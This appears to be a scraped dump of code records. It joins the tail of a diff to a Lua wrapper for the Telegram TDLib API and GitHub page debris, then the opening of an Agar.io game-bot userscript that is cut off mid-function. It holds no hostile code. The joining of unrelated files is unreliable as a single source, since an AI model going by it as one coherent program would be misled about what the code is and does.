+M.terminateSession = terminateSession + +-- Terminates all other sessions of logged in user +local function terminateAllOtherSessions(dl_cb, cmd) +  tdcli_function ({ +    ID = ""TerminateAllOtherSessions"", +  }, dl_cb, cmd) +end + +M.terminateAllOtherSessions = terminateAllOtherSessions + +-- Gives or revokes all members of the group editor rights. +-- Needs creator privileges in the group +-- @group_id Identifier of the group +-- @anyone_can_edit New value of anyone_can_edit +local function toggleGroupEditors(group_id, anyone_can_edit, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ToggleGroupEditors"", +    group_id_ = getChatId(group_id).ID, +    anyone_can_edit_ = anyone_can_edit +  }, dl_cb, cmd) +end + +M.toggleGroupEditors = toggleGroupEditors + +-- Changes username of the channel. +-- Needs creator privileges in the channel +-- @channel_id Identifier of the channel +-- @username New value of username. Use empty string to remove username +local function changeChannelUsername(channel_id, username, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeChannelUsername"", +    channel_id_ = getChatId(channel_id).ID, +    username_ = username +  }, dl_cb, cmd) +end + +M.changeChannelUsername = changeChannelUsername + +-- Gives or revokes right to invite new members to all current members of the channel. +-- Needs creator privileges in the channel. +-- Available only for supergroups +-- @channel_id Identifier of the channel +-- @anyone_can_invite New value of anyone_can_invite +local function toggleChannelInvites(channel_id, anyone_can_invite, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ToggleChannelInvites"", +    channel_id_ = getChatId(channel_id).ID, +    anyone_can_invite_ = anyone_can_invite +  }, dl_cb, cmd) +end + +M.toggleChannelInvites = toggleChannelInvites + +-- Enables or disables sender signature on sent messages in the channel. +-- Needs creator privileges in the channel. +-- Not available for supergroups +-- @channel_id Identifier of the channel +-- @sign_messages New value of sign_messages +local function toggleChannelSignMessages(channel_id, sign_messages, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ToggleChannelSignMessages"", +    channel_id_ = getChatId(channel_id).ID, +    sign_messages_ = sign_messages +  }, dl_cb, cmd) +end + +M.toggleChannelSignMessages = toggleChannelSignMessages + +-- Changes information about the channel. +-- Needs creator privileges in the broadcast channel or editor privileges in the supergroup channel +-- @channel_id Identifier of the channel +-- @about New value of about, 0-255 characters +local function changeChannelAbout(channel_id, about, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeChannelAbout"", +    channel_id_ = getChatId(channel_id).ID, +    about_ = about +  }, dl_cb, cmd) +end + +M.changeChannelAbout = changeChannelAbout + +-- Pins a message in a supergroup channel chat. +-- Needs editor privileges in the channel +-- @channel_id Identifier of the channel +-- @message_id Identifier of the new pinned message +-- @disable_notification True, if there should be no notification about the pinned message +local function pinChannelMessage(channel_id, message_id, disable_notification, dl_cb, cmd) +  tdcli_function ({ +    ID = ""PinChannelMessage"", +    channel_id_ = getChatId(channel_id).ID, +    message_id_ = message_id, +    disable_notification_ = disable_notification +  }, dl_cb, cmd) +end + +M.pinChannelMessage = pinChannelMessage + +-- Removes pinned message in the supergroup channel. +-- Needs editor privileges in the channel +-- @channel_id Identifier of the channel +local function unpinChannelMessage(channel_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""UnpinChannelMessage"", +    channel_id_ = getChatId(channel_id).ID +  }, dl_cb, cmd) +end + +M.unpinChannelMessage = unpinChannelMessage + +-- Reports some supergroup channel messages from a user as spam messages +-- @channel_id Channel identifier +-- @user_id User identifier +-- @message_ids Identifiers of messages sent in the supergroup by the user, the list should be non-empty +local function reportChannelSpam(channel_id, user_id, message_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ReportChannelSpam"", +    channel_id_ = getChatId(channel_id).ID, +    user_id_ = user_id, +    message_ids_ = message_ids -- vector +  }, dl_cb, cmd) +end + +M.reportChannelSpam = reportChannelSpam + +-- Returns information about channel members or kicked from channel users. +-- Can be used only if channel_full->can_get_members == true +-- @channel_id Identifier of the channel +-- @filter Kind of channel users to return, defaults to channelMembersRecent +-- @offset Number of channel users to skip +-- @limit Maximum number of users be returned, can\'t be greater than 200 +-- filter = Recent|Administrators|Kicked|Bots +local function getChannelMembers(channel_id, offset, filter, limit, dl_cb, cmd) +  if not limit or limit > 200 then +    limit = 200 +  end + +  tdcli_function ({ +    ID = ""GetChannelMembers"", +    channel_id_ = getChatId(channel_id).ID, +    filter_ = { +      ID = ""ChannelMembers"" .. filter +    }, +    offset_ = offset, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getChannelMembers = getChannelMembers + +-- Deletes channel along with all messages in corresponding chat. +-- Releases channel username and removes all members. +-- Needs creator privileges in the channel. +-- Channels with more than 1000 members can\'t be deleted +-- @channel_id Identifier of the channel +local function deleteChannel(channel_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteChannel"", +    channel_id_ = getChatId(channel_id).ID +  }, dl_cb, cmd) +end + +M.deleteChannel = deleteChannel + +-- Returns list of created public channels +local function getCreatedPublicChannels(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetCreatedPublicChannels"" +  }, dl_cb, cmd) +end + +M.getCreatedPublicChannels = getCreatedPublicChannels + +-- Closes secret chat +-- @secret_chat_id Secret chat identifier +local function closeSecretChat(secret_chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CloseSecretChat"", +    secret_chat_id_ = secret_chat_id +  }, dl_cb, cmd) +end + +M.closeSecretChat = closeSecretChat + +-- Returns user that can be contacted to get support +local function getSupportUser(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetSupportUser"", +  }, dl_cb, cmd) +end + +M.getSupportUser = getSupportUser + +-- Returns background wallpapers +local function getWallpapers(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetWallpapers"", +  }, dl_cb, cmd) +end + +M.getWallpapers = getWallpapers + +-- Registers current used device for receiving push notifications +-- @device_token Device token +-- device_token = apns|gcm|mpns|simplePush|ubuntuPhone|blackberry +local function registerDevice(device_token, token, device_token_set, dl_cb, cmd) +  local dToken = {ID = device_token .. \'DeviceToken\', token_ = token} + +  if device_token_set then +    dToken = {ID = ""DeviceTokenSet"", token_ = device_token_set} -- tokens:vector<DeviceToken> +  end + +  tdcli_function ({ +    ID = ""RegisterDevice"", +    device_token_ = dToken +  }, dl_cb, cmd) +end + +M.registerDevice = registerDevice + +-- Returns list of used device tokens +local function getDeviceTokens(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetDeviceTokens"", +  }, dl_cb, cmd) +end + +M.getDeviceTokens = getDeviceTokens + +-- Changes privacy settings +-- @key Privacy key +-- @rules New privacy rules +-- @privacyKeyUserStatus Privacy key for managing visibility of the user status +-- @privacyKeyChatInvite Privacy key for managing ability of invitation of the user to chats +-- @privacyRuleAllowAll Rule to allow all users +-- @privacyRuleAllowContacts Rule to allow all user contacts +-- @privacyRuleAllowUsers Rule to allow specified users +-- @user_ids User identifiers +-- @privacyRuleDisallowAll Rule to disallow all users +-- @privacyRuleDisallowContacts Rule to disallow all user contacts +-- @privacyRuleDisallowUsers Rule to disallow all specified users +-- key = UserStatus|ChatInvite +-- rules = AllowAll|AllowContacts|AllowUsers(user_ids)|DisallowAll|DisallowContacts|DisallowUsers(user_ids) +local function setPrivacy(key, rule, allowed_user_ids, disallowed_user_ids, dl_cb, cmd) +  local rules = {[0] = {ID = \'PrivacyRule\' .. rule}} + +  if allowed_user_ids then +    rules = { +      { +        ID = \'PrivacyRule\' .. rule +      }, +      [0] = { +        ID = ""PrivacyRuleAllowUsers"", +        user_ids_ = allowed_user_ids -- vector +      }, +    } +  end +  if disallowed_user_ids then +    rules = { +      { +        ID = \'PrivacyRule\' .. rule +      }, +      [0] = { +        ID = ""PrivacyRuleDisallowUsers"", +        user_ids_ = disallowed_user_ids -- vector +      }, +    } +  end +  if allowed_user_ids and disallowed_user_ids then +    rules = { +      { +        ID = \'PrivacyRule\' .. rule +      }, +      { +        ID = ""PrivacyRuleAllowUsers"", +        user_ids_ = allowed_user_ids +      }, +      [0] = { +        ID = ""PrivacyRuleDisallowUsers"", +        user_ids_ = disallowed_user_ids +      }, +    } +  end +  tdcli_function ({ +    ID = ""SetPrivacy"", +    key_ = { +      ID = \'PrivacyKey\' .. key +    }, +    rules_ = { +      ID = ""PrivacyRules"", +      rules_ = rules +    }, +  }, dl_cb, cmd) +end + +M.setPrivacy = setPrivacy + +-- Returns current privacy settings +-- @key Privacy key +-- key = UserStatus|ChatInvite +local function getPrivacy(key, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetPrivacy"", +    key_ = { +      ID = ""PrivacyKey"" .. key +    }, +  }, dl_cb, cmd) +end + +M.getPrivacy = getPrivacy + +-- Returns value of an option by its name. +-- See list of available options on https://core.telegram.org/tdlib/options +-- @name Name of the option +local function getOption(name, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetOption"", +    name_ = name +  }, dl_cb, cmd) +end + +M.getOption = getOption + +-- Sets value of an option. +-- See list of available options on https://core.telegram.org/tdlib/options. +-- Only writable options can be set +-- @name Name of the option +-- @value New value of the option +local function setOption(name, option, value, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetOption"", +    name_ = name, +    value_ = { +      ID = \'Option\' .. option, +      value_ = value +    }, +  }, dl_cb, cmd) +end + +M.setOption = setOption + +-- Changes period of inactivity, after which the account of currently logged in user will be automatically deleted +-- @ttl New account TTL +local function changeAccountTtl(days, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeAccountTtl"", +    ttl_ = { +      ID = ""AccountTtl"", +      days_ = days +    }, +  }, dl_cb, cmd) +end + +M.changeAccountTtl = changeAccountTtl + +-- Returns period of inactivity, after which the account of currently logged in user will be automatically deleted +local function getAccountTtl(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetAccountTtl"", +  }, dl_cb, cmd) +end + +M.getAccountTtl = getAccountTtl + +-- Deletes the account of currently logged in user, deleting from the server all information associated with it. +-- Account\'s phone number can be used to create new account, but only once in two weeks +-- @reason Optional reason of account deletion +local function deleteAccount(reason, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteAccount"", +    reason_ = reason +  }, dl_cb, cmd) +end + +M.deleteAccount = deleteAccount + +-- Returns current chat report spam state +-- @chat_id Chat identifier +local function getChatReportSpamState(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetChatReportSpamState"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.getChatReportSpamState = getChatReportSpamState + +-- Reports chat as a spam chat or as not a spam chat. +-- Can be used only if ChatReportSpamState.can_report_spam is true. +-- After this request ChatReportSpamState.can_report_spam became false forever +-- @chat_id Chat identifier +-- @is_spam_chat If true, chat will be reported as a spam chat, otherwise it will be marked as not a spam chat +local function changeChatReportSpamState(chat_id, is_spam_chat, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeChatReportSpamState"", +    chat_id_ = chat_id, +    is_spam_chat_ = is_spam_chat +  }, dl_cb, cmd) +end + +M.changeChatReportSpamState = changeChatReportSpamState + +-- Bots only. +-- Informs server about number of pending bot updates if they aren\'t processed for a long time +-- @pending_update_count Number of pending updates +-- @error_message Last error\'s message +local function setBotUpdatesStatus(pending_update_count, error_message, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetBotUpdatesStatus"", +    pending_update_count_ = pending_update_count, +    error_message_ = error_message +  }, dl_cb, cmd) +end + +M.setBotUpdatesStatus = setBotUpdatesStatus + +-- Returns Ok after specified amount of the time passed +-- @seconds Number of seconds before that function returns +local function setAlarm(seconds, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetAlarm"", +    seconds_ = seconds +  }, dl_cb, cmd) +end + +M.setAlarm = setAlarm + +-- Text message +-- @text Text to send +-- @disable_notification Pass true, to disable notification about the message, doesn\'t works in secret chats +-- @from_background Pass true, if the message is sent from background +-- @reply_markup Bots only. Markup for replying to message +-- @disable_web_page_preview Pass true to disable rich preview for link in the message text +-- @clear_draft Pass true if chat draft message should be deleted +-- @entities Bold, Italic, Code, Pre, PreCode and TextUrl entities contained in the text. Non-bot users can\'t use TextUrl entities. Can\'t be used with non-null parse_mode +-- @parse_mode Text parse mode, nullable. Can\'t be used along with enitities +local function sendMessage(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode) +  local TextParseMode = getParseMode(parse_mode) +   +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = 1, +    reply_markup_ = nil, +    input_message_content_ = { +      ID = ""InputMessageText"", +      text_ = text, +      disable_web_page_preview_ = disable_web_page_preview, +      clear_draft_ = 0, +      entities_ = {}, +      parse_mode_ = TextParseMode, +    }, +  }, dl_cb, nil) +end + +M.sendMessage = sendMessage + +-- Animation message +-- @animation Animation file to send +-- @thumb Animation thumb, if available +-- @width Width of the animation, may be replaced by the server +-- @height Height of the animation, may be replaced by the server +-- @caption Animation caption, 0-200 characters +local function sendAnimation(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, animation, width, height, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageAnimation"", +      animation_ = getInputFile(animation), +      --thumb_ = { +        --ID = ""InputThumb"", +        --path_ = path, +        --width_ = width, +        --height_ = height +      --}, +      width_ = width or \'\', +      height_ = height or \'\', +      caption_ = caption or \'\' +    }, +  }, dl_cb, cmd) +end + +M.sendAnimation = sendAnimation + +-- Audio message +-- @audio Audio file to send +-- @album_cover_thumb Thumb of the album\'s cover, if available +-- @duration Duration of audio in seconds, may be replaced by the server +-- @title Title of the audio, 0-64 characters, may be replaced by the server +-- @performer Performer of the audio, 0-64 characters, may be replaced by the server +-- @caption Audio caption, 0-200 characters +local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, title, performer, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageAudio"", +      audio_ = getInputFile(audio), +      --album_cover_thumb_ = { +        --ID = ""InputThumb"", +        --path_ = path, +        --width_ = width, +        --height_ = height +      --}, +      duration_ = duration or \'\', +      title_ = title or \'\', +      performer_ = performer or \'\', +      caption_ = caption or \'\' +    }, +  }, dl_cb, cmd) +end + +M.sendAudio = sendAudio + +-- Document message +-- @document Document to send +-- @thumb Document thumb, if available +-- @caption Document caption, 0-200 characters +local function sendDocument(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageDocument"", +      document_ = getInputFile(document), +      --thumb_ = { +        --ID = ""InputThumb"", +        --path_ = path, +        --width_ = width, +        --height_ = height +      --}, +      caption_ = caption +    }, +  }, dl_cb, cmd) +end + +M.sendDocument = sendDocument + +-- Photo message +-- @photo Photo to send +-- @caption Photo caption, 0-200 characters +local function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessagePhoto"", +      photo_ = getInputFile(photo), +      added_sticker_file_ids_ = {}, +      width_ = 0, +      height_ = 0, +      caption_ = caption +    }, +  }, dl_cb, cmd) +end + +M.sendPhoto = sendPhoto + +-- Sticker message +-- @sticker Sticker to send +-- @thumb Sticker thumb, if available +local function sendSticker(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageSticker"", +      sticker_ = getInputFile(sticker), +      --thumb_ = { +        --ID = ""InputThumb"", +        --path_ = path, +        --width_ = width, +        --height_ = height +      --}, +    }, +  }, dl_cb, cmd) +end + +M.sendSticker = sendSticker + +-- Video message +-- @video Video to send +-- @thumb Video thumb, if available +-- @duration Duration of video in seconds +-- @width Video width +-- @height Video height +-- @caption Video caption, 0-200 characters +local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageVideo"", +      video_ = getInputFile(video), +      --thumb_ = { +        --ID = ""InputThumb"", +        --path_ = path, +        --width_ = width, +        --height_ = height +      --}, +      added_sticker_file_ids_ = {}, +      duration_ = duration or \'\', +      width_ = width or \'\', +      height_ = height or \'\', +      caption_ = caption or \'\' +    }, +  }, dl_cb, cmd) +end + +M.sendVideo = sendVideo + +-- Voice message +-- @voice Voice file to send +-- @duration Duration of voice in seconds +-- @waveform Waveform representation of the voice in 5-bit format +-- @caption Voice caption, 0-200 characters +local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageVoice"", +      voice_ = getInputFile(voice), +      duration_ = duration or \'\', +      waveform_ = waveform or \'\', +      caption_ = caption or \'\' +    }, +  }, dl_cb, cmd) +end + +M.sendVoice = sendVoice + +-- Message with location +-- @latitude Latitude of location in degrees as defined by sender +-- @longitude Longitude of location in degrees as defined by sender +local function sendLocation(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, latitude, longitude, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageLocation"", +      location_ = { +        ID = ""Location"", +        latitude_ = latitude, +        longitude_ = longitude +      }, +    }, +  }, dl_cb, cmd) +end + +M.sendLocation = sendLocation + +-- Message with information about venue +-- @venue Venue to send +-- @latitude Latitude of location in degrees as defined by sender +-- @longitude Longitude of location in degrees as defined by sender +-- @title Venue name as defined by sender +-- @address Venue address as defined by sender +-- @provider Provider of venue database as defined by sender. Only ""foursquare"" need to be supported currently +-- @id Identifier of the venue in provider database as defined by sender +local function sendVenue(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, latitude, longitude, title, address, id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageVenue"", +      venue_ = { +        ID = ""Venue"", +        location_ = { +          ID = ""Location"", +          latitude_ = latitude, +          longitude_ = longitude +        }, +        title_ = title, +        address_ = address, +        provider_ = \'foursquare\', +        id_ = id +      }, +    }, +  }, dl_cb, cmd) +end + +M.sendVenue = sendVenue + +-- User contact message +-- @contact Contact to send +-- @phone_number User\'s phone number +-- @first_name User first name, 1-255 characters +-- @last_name User last name +-- @user_id User identifier if known, 0 otherwise +local function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageContact"", +      contact_ = { +        ID = ""Contact"", +        phone_number_ = phone_number, +        first_name_ = first_name, +        last_name_ = last_name, +        user_id_ = user_id +      }, +    }, +  }, dl_cb, cmd) +end + +M.sendContact = sendContact + +-- Message with a game +-- @bot_user_id User identifier of a bot owned the game +-- @game_short_name Game short name +local function sendGame(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, bot_user_id, game_short_name, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageGame"", +      bot_user_id_ = bot_user_id, +      game_short_name_ = game_short_name +    }, +  }, dl_cb, cmd) +end + +M.sendGame = sendGame + +-- Forwarded message +-- @from_chat_id Chat identifier of the message to forward +-- @message_id Identifier of the message to forward +local function sendForwarded(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, from_chat_id, message_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageForwarded"", +      from_chat_id_ = from_chat_id, +      message_id_ = message_id +    }, +  }, dl_cb, cmd) +end + +M.sendForwarded = sendForwarded + +return M cli/tg/tgcli (Binary file not shown.) 0 comments on commit 3233fdf  Comment on 3233fdf   Leave a comment Comment  Desktop version",,2
0,https://github.com/osman21/agarbot.js.git,"/*The MIT License (MIT)  Copyright (c) 2015 Apostolique  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*/  // ==UserScript== // @name        AposBot // @namespace   AposBot // @include     http://agarz.com/* // @version     3.645 // @grant       none // @author      http://www.twitch.tv/apostolique // ==/UserScript==  var aposBotVersion = 3.645;  //TODO: Team mode //      Detect when people are merging //      Split to catch smaller targets //      Angle based cluster code //      Better wall code //      In team mode, make allies be obstacles.  /* Number.prototype.mod = function(n) {     return ((this % n) + n) % n; }; */  Array.prototype.peek = function() {     return this[this.length - 1]; };  var sha = ""efde0488cc2cc176db48dd23b28a20b90314352b""; function getLatestCommit() {     window.jQuery.ajax({             url: ""https://api.github.com/repos/apostolique/Agar.io-bot/git/refs/heads/master"",             cache: false,             dataType: ""jsonp""         }).done(function(data) {             console.dir(data.data);             console.log(""hmm: "" + data.data.object.sha);             sha = data.data.object.sha;              function update(prefix, name, url) {                 window.jQuery(document.body).prepend(""<div id=\'"" + prefix + ""Dialog\' style=\'position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 100; display: none;\'>"");                 window.jQuery(\'#\' + prefix + \'Dialog\').append(""<div id=\'"" + prefix + ""Message\' style=\'width: 350px; background-color: #FFFFFF; margin: 100px auto; border-radius: 15px; padding: 5px 15px 5px 15px;\'>"");                 window.jQuery(\'#\' + prefix + \'Message\').append(""<h2>UPDATE TIME!!!</h2>"");                 window.jQuery(\'#\' + prefix + \'Message\').append(""<p>Grab the update for: <a id=\'"" + prefix + ""Link\' href=\'"" + url + ""\' target=\\""_blank\\"">"" + name + ""</a></p>"");                 window.jQuery(\'#\' + prefix + \'Link\').on(\'click\', function() {                     window.jQuery(""#"" + prefix + ""Dialog"").hide();                     window.jQuery(""#"" + prefix + ""Dialog"").remove();                 });                 window.jQuery(""#"" + prefix + ""Dialog"").show();             }              $.get(\'https://raw.githubusercontent.com/Apostolique/Agar.io-bot/master/bot.user.js?\' + Math.floor((Math.random() * 1000000) + 1), function(data) {                 var latestVersion = data.replace(/(\\r\\n|\\n|\\r)/gm,"""");                 latestVersion = latestVersion.substring(latestVersion.indexOf(""// @version"")+11,latestVersion.indexOf(""// @grant""));                  latestVersion = parseFloat(latestVersion + 0.0000);                 var myVersion = parseFloat(aposBotVersion + 0.0000);                                   if(latestVersion > myVersion)                 {                     update(""aposBot"", ""bot.user.js"", ""https://github.com/Apostolique/Agar.io-bot/blob/"" + sha + ""/bot.user.js/"");                 }                 console.log(\'Current bot.user.js Version: \' + myVersion + "" on Github: "" + latestVersion);             });          }).fail(function() {}); } getLatestCommit();  console.log(""Running Apos Bot!"");  var f = window; var g = window.jQuery;   console.log(""Apos Bot!"");  window.botList = window.botList || [];  /*function QuickBot() {     this.name = ""QuickBot V1"";     this.customParameters = {};     this.keyAction = function(key) {};     this.displayText = function() {return [];};     this.mainLoop = function() {         return [screenToGameX(getMouseX()),                 screenToGameY(getMouseY())];     }; }  window.botList.push(new QuickBot());*/  function AposBot() {     this.name = ""AposBot "" + aposBotVersion;      this.toggleFollow = false;     this.keyAction = function(key) {         if (81 == key.keyCode) {             console.log(""Toggle Follow Mouse!"");             this.toggleFollow = !this.toggleFollow;         }     };      this.displayText = function() {         return [""Q - Follow Mouse: "" + (this.toggleFollow ? ""On"" : ""Off"")];     };      // Using mod function instead the prototype directly as it is very slow     this.mod = function(num, mod) {         if (mod & (mod - 1) === 0 && mod !== 0) {             return num & (mod - 1);         }         return num < 0 ? ((num % mod) + mod) % mod : num % mod;     };     this.splitDistance = 710;      this.isMerging = function(cell1, cell2) {                 var dist = this.computeDistance(cell1.x, cell1.y, cell2.x, cell2.y, cell1.size, cell2.size);                  //debug logging         if (false){         var params = [cell1.x, cell1.y, cell2.x, cell2.y, cell1.size, cell2.size, dist];         var debugString = params.join("", "");         console.log(""Merge:"" + debugString);         }                  return dist <= -50;     };      //Given an angle value that was gotten from valueAndleBased(),     //returns a new value that scales it appropriately.     this.paraAngleValue = function(angleValue, range) {         return (15 / (range[1])) * (angleValue * angleValue) - (range[1] / 6);     };      this.getMass = function(size) {         return Math.pow(size / 10, 2);     };      this.valueAngleBased = function(angle, range) {         var leftValue = this.mod(angle - range[0], 360);         var rightValue = this.mod(this.rangeToAngle(range) - angle, 360);          var bestValue = Math.min(leftValue, rightValue);          if (bestValue <= range[1]) {             return this.paraAngleValue(bestValue, range);         }         return -1;     };      this.computeDistance = function(x1, y1, x2, y2, s1, s2) {         // Make sure there are no null optional params.         s1 = s1 || 0;         s2 = s2 || 0;         var xdis = x1 - x2; // <--- FAKE AmS OF COURSE!         var ydis = y1 - y2;         var distance = Math.sqrt(xdis * xdis + ydis * ydis) - (s1 + s2);          return distance;     };      // Get a distance that is Inexpensive on the cpu for various purpaces     this.computeInexpensiveDistance = function(x1, y1, x2, y2, s1, s2) {         // Make sure there are no null optional params.         s1 = s1 || 0;         s2 = s2 || 0;         var xdis = x1 - x2;         var ydis = y1 - y2;         // Get abs quickly         xdis = xdis < 0 ? xdis * -1 : xdis;         ydis = ydis < 0 ? ydis * -1 : ydis;          var distance = xdis + ydis;          return distance;     };      this.computeDistanceFromCircleEdgeDeprecated = function(x1, y1, x2, y2, s2) {         var tempD = this.computeDistance(x1, y1, x2, y2);          var offsetX = 0;         var offsetY = 0;          var ratioX = tempD / (x1 - x2);         var ratioY = tempD / (y1 - y2);          offsetX = x1 - (s2 / ratioX);         offsetY = y1 - (s2 / ratioY);          drawPoint(offsetX, offsetY, 5, """");          return this.computeDistance(x2, y2, offsetX, offsetY);     };      this.compareSize = function(player1, player2, ratio) {         if (player1.size * player1.size * ratio < player2.size * player2.size) {             return true;         }         return false;     },      this.canSplit = function(player1, player2) {         return this.compareSize(player1, player2, 2.8) && !this.compareSize(player1, player2, 20);     };      this.isItMe = function(player, cell) {         if (getMode() == "":teams"") {             var currentColor = player[0].color;             var currentRed = currentColor.substring(1,3);             var currentGreen = currentColor.substring(3,5);             var currentBlue = currentColor.substring(5,7);                          var currentTeam = this.getTeam(currentRed, currentGreen, currentBlue);              var cellColor = cell.color;              var cellRed = cellColor.substring(1,3);             var cellGreen = cellColor.substring(3,5);             var cellBlue = cellColor.substring(5,7);              var cellTeam = this.getTeam(cellRed, cellGreen, cellBlue);              if (currentTeam == cellTeam && !cell.isVirus()) {                 return true;             }              //console.log(""COLOR: "" + color);          } else {             for (var i = 0; i < player.length; i++) {                 if (cell.id == player[i].id) {                     return true;                 }             }         }         return false;     };      this.getTeam = function(red, green, blue) {         if (red == ""ff"") {             return 0;         } else if (green == ""ff"") {             return 1;         }         return 2;     };      this.isFood = function(blob, cell) {         if (!cell.isVirus() && this.compareSize(cell, blob, 1.33) || (cell.size <= 13)) {             return true;         }         return false;     };      this.isThreat = function(blob, cell) {                  if (!cell.isVirus() && this.compareSize(blob, cell, 1.30)) {             return true;         }         return false;     };      this.isVirus = function(blob, cell) {         if (blob == null) {             if 